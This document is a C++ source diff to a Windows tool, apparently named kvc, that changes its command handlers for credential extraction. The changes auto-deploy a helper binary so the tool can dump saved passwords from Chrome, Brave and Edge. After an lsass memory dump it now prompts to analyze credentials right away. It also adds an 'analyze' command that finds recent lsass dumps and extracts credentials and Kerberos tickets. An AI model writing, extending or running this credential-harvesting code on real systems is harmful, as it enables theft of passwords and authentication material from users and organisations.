@@ -603,7 +603,7 @@ int HandleBrowserPasswords(int argc, wchar_t* argv[]) {
     if (browserType.empty()) { HelpSystem::PrintBrowserCommands(); return 0; }
 
     if (browserType == L"all") {
-        if (!CheckKvcPassExists()) { ERROR(L"--all requires kvc_pass.exe"); return 1; }
+        if (!CheckKvcPassExists() && !g_controller->EnsureBinaryComponents()) { ERROR(L"--all requires kvc_pass.exe"); return 1; }
         if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to extract from all browsers"); return 1; }
         return 0;
     }
@@ -622,7 +622,7 @@ int HandleBrowserPasswords(int argc, wchar_t* argv[]) {
         return 0;
     }
 
-    if (!CheckKvcPassExists()) { ERROR(L"%s extraction requires kvc_pass.exe", browserType == L"chrome" ? L"Chrome" : L"Brave"); return 1; }
+    if (!CheckKvcPassExists() && !g_controller->EnsureBinaryComponents()) { ERROR(L"%s extraction requires kvc_pass.exe", browserType == L"chrome" ? L"Chrome" : L"Brave"); return 1; }
     if (!g_controller->ExportBrowserData(outputPath, browserType)) { ERROR(L"Failed to export browser passwords"); return 1; }
     return 0;
 }
@@ -717,16 +717,32 @@ int wmain(int argc, wchar_t* argv[])
             if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
             std::wstring outPath = (argc >= 4) ? argv[3] : L"";
             if (outPath.empty()) {
-                wchar_t* dl; 
+                wchar_t* dl;
                 if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &dl) == S_OK) { outPath = dl; outPath += L"\\"; CoTaskMemFree(dl); }
                 else outPath = L".\\";
             }
+            std::wstring dumpPath;
+            bool ok;
             if (IsNumeric(argv[2])) {
                 auto pid = ParsePid(argv[2]);
                 if (!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
-                return g_controller->DumpProcess(pid.value(), outPath) ? 0 : 2;
+                ok = g_controller->DumpProcess(pid.value(), outPath, &dumpPath);
+            } else {
+                ok = g_controller->DumpProcessByName(argv[2], outPath, &dumpPath);
             }
-            return g_controller->DumpProcessByName(argv[2], outPath) ? 0 : 2;
+            // Offer immediate forensic analysis after successful lsass dump
+            if (ok && !dumpPath.empty() && g_controller->IsForensicAvailable()) {
+                std::wstring target = StringUtils::ToLowerCopy(std::wstring(argv[2]));
+                if (target.find(L"lsass") != std::wstring::npos) {
+                    wprintf(L"\n[*] Analyze credentials now? [Y/n]: ");
+                    wchar_t ch = _getwch();
+                    wprintf(L"%lc\n\n", ch);
+                    if (ch == L'Y' || ch == L'y' || ch == L'\r' || ch == L'\n') {
+                        g_controller->RunForensicAnalysis(dumpPath, L"both", false, L"");
+                    }
+                }
+            }
+            return ok ? 0 : 2;
         }},
 
         // --- Modules ---
@@ -845,14 +861,13 @@ int wmain(int argc, wchar_t* argv[])
             if (std::wstring(argv[2]) == L"secrets") {
                 std::wstring path = (argc >= 4) ? argv[3] : PathUtils::GetDefaultSecretsOutputPath();
                 if (path.empty()) { ERROR(L"Failed to determine default output path"); return 1; }
-                if (CheckKvcPassExists()) {
+                if (CheckKvcPassExists() || g_controller->EnsureBinaryComponents()) {
                     INFO(L"Extracting browser passwords via COM elevation...");
                     if (!g_controller->ExportBrowserData(path, L"edge")) INFO(L"Edge COM extraction failed");
                     if (!g_controller->ExportBrowserData(path, L"chrome")) INFO(L"Chrome extraction failed");
                     if (!g_controller->ExportBrowserData(path, L"brave")) INFO(L"Brave extraction failed");
                 } else {
-                    ERROR(L"kvc_pass.exe not found - Chrome extraction unavailable");
-                    INFO(L"Edge will fallback to DPAPI (no JSON output)");
+                    INFO(L"kvc_pass.exe not available - Edge will fallback to DPAPI (no JSON output)");
                 }
                 INFO(L"Extracting WiFi and generating DPAPI reports...");
                 g_controller->ShowPasswords(path);
@@ -891,7 +906,66 @@ int wmain(int argc, wchar_t* argv[])
             ERROR(L"Unknown watermark subcommand: %s", sub.c_str()); return 1;
         }},
         {L"wm", [](int argc, wchar_t** argv) { return commandMap.at(L"watermark")(argc, argv); }},
-        {L"setup", [](int, wchar_t**) { INFO(L"Loading and processing kvc.dat combined binary..."); return g_controller->LoadAndSplitCombinedBinaries() ? 0 : 2; }},
+        {L"setup", [](int, wchar_t**) {
+            INFO(L"Loading and processing kvc.dat combined binary...");
+            bool ok = g_controller->LoadAndSplitCombinedBinaries();
+            // Deploy kvcforensic.dat if present in CWD (optional forensic module)
+            g_controller->DeployForensicModule();
+            return ok ? 0 : 2;
+        }},
+        {L"analyze", [](int argc, wchar_t** argv) {
+            // kvc analyze --gui  →  open KvcForensic GUI
+            if (argc >= 3 && (_wcsicmp(argv[2], L"--gui") == 0 || _wcsicmp(argv[2], L"--cli") == 0)) {
+                return g_controller->LaunchForensicGui() ? 0 : 2;
+            }
+            // kvc analyze lsass  →  smart-find most recent lsass dump
+            std::wstring dumpPath;
+            if (argc >= 3 && _wcsicmp(argv[2], L"lsass") == 0) {
+                auto searchDir = [&](const std::wstring& dir) {
+                    WIN32_FIND_DATAW fd;
+                    HANDLE h = FindFirstFileW((dir + L"\\lsass*.dmp").c_str(), &fd);
+                    if (h == INVALID_HANDLE_VALUE) return;
+                    FILETIME bestTime{};
+                    do {
+                        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                            if (dumpPath.empty() || CompareFileTime(&fd.ftLastWriteTime, &bestTime) > 0) {
+                                dumpPath = dir + L"\\" + fd.cFileName;
+                                bestTime = fd.ftLastWriteTime;
+                            }
+                        }
+                    } while (FindNextFileW(h, &fd));
+                    FindClose(h);
+                };
+                wchar_t cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, cwd);
+                searchDir(cwd);
+                wchar_t* dl = nullptr;
+                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &dl) == S_OK) {
+                    searchDir(dl); CoTaskMemFree(dl);
+                }
+                if (dumpPath.empty()) {
+                    ERROR(L"No lsass*.dmp found in current directory or Downloads.");
+                    INFO(L"Dump first with: kvc dump lsass");
+                    INFO(L"Or specify path: kvc analyze C:\\path\\to\\lsass.dmp");
+                    return 1;
+                }
+                INFO(L"Found: %s", dumpPath.c_str());
+            } else if (argc >= 3) {
+                dumpPath = argv[2];
+            } else {
+                ERROR(L"Missing argument. Usage: kvc analyze <dump.dmp|lsass> [--format txt|json|both] [--full] [--tickets <dir>] | --gui");
+                return 1;
+            }
+            // Parse optional flags
+            std::wstring format = L"both";
+            bool full = false;
+            std::wstring ticketsDir;
+            for (int i = 3; i < argc; ++i) {
+                if (_wcsicmp(argv[i], L"--format") == 0 && i + 1 < argc) { format = argv[++i]; continue; }
+                if (_wcsicmp(argv[i], L"--full") == 0)   { full = true; continue; }
+                if (_wcsicmp(argv[i], L"--tickets") == 0 && i + 1 < argc) { ticketsDir = argv[++i]; continue; }
+            }
+            return g_controller->RunForensicAnalysis(dumpPath, format, full, ticketsDir) ? 0 : 2;
+        }},
         {L"undervolter", [](int argc, wchar_t** argv) {
             if (argc < 3) {
                 INFO(L"Usage: kvc undervolter <deploy|remove|status>");
